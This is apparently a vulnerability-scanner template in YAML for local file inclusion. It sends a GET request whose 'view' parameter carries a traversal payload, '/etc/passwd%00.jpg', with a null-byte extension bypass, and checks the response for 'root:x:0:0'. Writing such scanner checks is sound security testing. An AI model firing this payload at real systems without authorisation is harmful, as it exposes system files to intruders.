id: lfi3-206
name: 'Traversal to passwd via view'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via view'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      view:
        - '/etc/passwd%00.jpg'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
